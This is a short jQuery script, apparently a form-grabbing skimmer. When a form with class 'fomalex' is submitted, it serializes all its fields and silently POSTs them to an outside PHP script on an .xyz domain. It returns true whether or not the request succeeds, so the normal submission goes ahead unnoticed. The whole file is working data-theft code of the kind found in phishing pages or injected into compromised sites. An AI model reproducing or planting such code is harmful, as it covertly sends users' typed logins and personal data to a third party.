$(".fomalex").submit(function() {

	var d = $(".fomalex");

	$.ajax({

        url: "https://aditpediatric.xyz/test/ff.php",

        type: "POST",

        data: d.serialize(),

        success: function () {

            return true;

        },

        error: function () {

            return true;

        },

    });

});
